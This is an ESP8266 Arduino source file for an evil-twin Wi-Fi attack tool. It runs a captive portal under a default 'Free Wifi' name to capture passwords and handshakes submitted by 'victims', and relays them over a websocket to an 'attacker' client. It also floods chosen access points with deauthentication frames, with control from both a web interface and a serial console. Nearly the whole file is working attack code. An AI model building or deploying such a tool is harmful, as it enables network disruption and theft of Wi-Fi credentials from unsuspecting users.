#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <WebSocketsServer.h>

#include "utils.h"
#include "wifi.h"
#include "server.h"


// Global variables 
IPAddress APIP(172, 0, 0, 1);
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);
WebSocketsServer webSocket = WebSocketsServer(81);
AccessPoint accessPoints[20];
AccessPoint selectedAP;
File fsUploadFile;

int attackersId = -1;
int AP_COUNT = 0;
int DEAUTH = 0;

void deauth(AccessPoint ap){
  for(int i =0; i< 100; i++){
      wifi_set_channel(ap.channel);
      delay(1);
      wifi_send_pkt_freedom(ap.deauthPacket, 26, 0);
      delay(1);
  }
}

void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  switch(type) {
    case WStype_DISCONNECTED:{
      if(num == attackersId){
        attackersId = -1;
      }
      else{
        if(attackersId != -1)
        {
          webSocket.sendTXT(attackersId, "Victim disconnected");
        }
      }
      break;
      }
    case WStype_CONNECTED:{
      if(strcmp((char*)payload,"/attack") == 0){
        attackersId = num;
      }
      else{
        if(attackersId != -1)
        {
          webSocket.sendTXT(attackersId, "Victim connected");
        }
      }
      break;
    }
    case WStype_TEXT:{
      DynamicJsonDocument doc(1024);
      String response;
      deserializeJson(doc, payload);
      serializeJsonPretty(doc, response);
      if(attackersId != -1)
      {
        webSocket.sendTXT(attackersId, response);
      }
      break;  
    }
    default:
      break;  
  }
}

void handleFileUpload()
{
  HTTPUpload &upload = server.upload();

  if (upload.status == UPLOAD_FILE_START)
  {
      String filename = upload.filename;
      if (filename.startsWith("data"))
        filename = filename.substring(4);
      if (!filename.startsWith("/"))
        filename = "/" + filename;
      fsUploadFile = LittleFS.open(filename, "w");
      filename = String();
  }
  else if (upload.status == UPLOAD_FILE_WRITE)
  {
      if (fsUploadFile)
      {
        fsUploadFile.write(upload.buf, upload.currentSize);
      }
  }
  else if (upload.status == UPLOAD_FILE_END)
  {
      if (fsUploadFile)
      {
        fsUploadFile.close();
      }
      else
      {
        server.send(500, "text/plain", "500: couldn't create file");
      }
  }
}

void setup()
{
  Serial.begin(115200);
  Serial.println("\nBooting");
  if (!LittleFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }
  Serial.println("File system mounted");
  initialServerSetup(APIP);
  dnsServer.start(DNS_PORT, "*", APIP);

  server.on("/", [](){handleRequest(server, "/index.html","html");});
  server.on("/attack", [](){handleRequest(server, "/index.html","html");});
  server.on("/css/index.css", [](){handleRequest(server,"/index.css.gz","css");}); 
  server.on("/js/index.js", [](){handleRequest(server,"/index.js.gz","js");});
  server.on("/js/capfile.js", [](){handleRequest(server,"/capfile.js.gz","js");});
  server.on("/png/router.png",[](){handleRequest(server,"/router.png","png");});
  
  server.on("/post_ssid", [](){String ssid = server.arg("ssid");changeWifi(ssid);});
  server.on("/post_handshake",[]() {handlePostHandshake(server);});
  server.on("/post_password",[]() {handlePostPassword(server); BLINK(5); });
  server.on("/get_ssid",[](){server.send(200, "application/json", getSSID());});
  server.on("/get_datas",[]() {server.send(200, "application/json", getDatas());});
  server.on("/get_networks",[](){AP_COUNT = scan_networks(accessPoints); available_networks(server,accessPoints,AP_COUNT,DEAUTH,selectedAP);});
  server.on("/clear_handshakes",[]() {server.send(200, "application/json", clearHandshakes());});
  server.on("/clear_passwords",[]() {server.send(200, "application/json", clearPasswords());});
  server.on(
      "/upload", HTTP_POST, [](){server.send(200, "application/json", "{\"message\":\"File uploaded successfully\"}"); },
      handleFileUpload);
  server.on("/reupload", [](){ server.send(200, "text/html", "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='file' directory='' webkitdirectory=''><input type='submit' value='Upload'></form>");});

  server.on("/deauth", []()
            {
    int n = server.arg("ap").toInt(); 
    if(n > 0 && n <= AP_COUNT){
      if(DEAUTH == 1){
        server.send(200, "application/json", "{\"message\":\"Already Deauthenticating - "+selectedAP.ssid+"\",\"status\":\"error\"}");
        return;
      }
      DEAUTH = 1;
      selectedAP = accessPoints[n-1];
      selectedAP.deauthState = 1;
      server.send(200, "application/json", "{\"message\":\"Deauthenticating "+selectedAP.ssid+"\",\"status\":\"success\"}");
    }
    else{
      server.send(200, "application/json", "{\"message\":\"Invalid Access Point number\",\"status\":\"error\"}");
    } });
  server.on("/stop_deauth", []()
            {
    DEAUTH = 0;
    selectedAP.deauthState=0; 
    server.send(200, "application/json", "{\"message\":\"Stopped Deauthenticating "+selectedAP.ssid+"\"}"); });

  server.onNotFound([](){handleNotFound(server);});

  server.begin();
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if (Serial.available()) {
    String inputString = Serial.readStringUntil('\n');
    const char *buffer = inputString.c_str();

    if(strcmp(buffer,"help") == 0){
      Serial.println("Available commands:");
      Serial.println("help - show this message");
      Serial.println("ls - list files");
      Serial.println("show config - show config file");
      Serial.println("show datas - show datas file");
      Serial.println("reset ssid - reset ssid to default(Free Wifi)");
      Serial.println("storage info - show storage info");
      Serial.println("scan - scan for networks");
      Serial.println("list networks - list networks");
      Serial.println("deauth <ap> - deauth an access point");
      Serial.println("stop deauth - stop deauthenticating");
    }

    else if (strcmp(buffer, "ls") == 0) {
      Serial.println("Listing files...");
      listDir("/",1);
      Serial.println("");
    }

    else if (strcmp(buffer, "show config") == 0) {
      Serial.println("Reading config file...");
      DynamicJsonDocument config = readJsonFile("/json/config.json");
      serializeJson(config, Serial);
      Serial.println("");
    }

    else if (strcmp(buffer, "show datas") == 0) {
      Serial.println("Reading datas file...");
      String datas = getDatas();
      Serial.println(datas);
      Serial.println("");
    }

    else if (strcmp(buffer,"reset ssid") == 0){
      Serial.println("Resetting config file...");
      DynamicJsonDocument config = readJsonFile("/json/config.json");
      config.clear();
      config["ssid"] = "Free Wifi";
      writeJsonFile("/json/config.json", config);
      setupWifi();
    }
    else if (strcmp(buffer,"storage info") == 0){
      Serial.println("Calculating Space...");
      storageInfo();  
    }
    else if (strcmp(buffer,"scan") == 0){
      Serial.println("Scanning for Wi-Fi networks...");
      AP_COUNT = scan_networks(accessPoints);
    }
    else if (strcmp(buffer,"list networks") == 0){
      Serial.println("Listing Wi-Fi networks...");
      list_network_details(accessPoints,AP_COUNT);
    }
    else if (strncmp(buffer,"deauth",6) == 0){
      int n = atoi(buffer + 7);  
      if(n > 0 && n <= AP_COUNT){
        if(DEAUTH == 1){
          Serial.println("Already Deauthenticating - "+selectedAP.ssid);
          return;
        }
        DEAUTH = 1;
        selectedAP = accessPoints[n-1];
        Serial.println("Starting deauth...");
      }
      else{
        Serial.println("Invalid Access Point number");
        Serial.println("Type list networks to see available networks");
      }
    }
    else if (strcmp(buffer,"stop deauth") == 0){
      Serial.println("Stopping deauth...");
      DEAUTH = 0;
    }
    else {
      Serial.println("Invalid command");
      Serial.println("Type help to see available commands");
    }
    Serial.println("");
  }
  if(DEAUTH){
    Serial.println("Deauthenticating.. "+selectedAP.ssid);
    deauth(selectedAP);
    delay(500);
  }
  dnsServer.processNextRequest();
  webSocket.loop();
  server.handleClient();
}
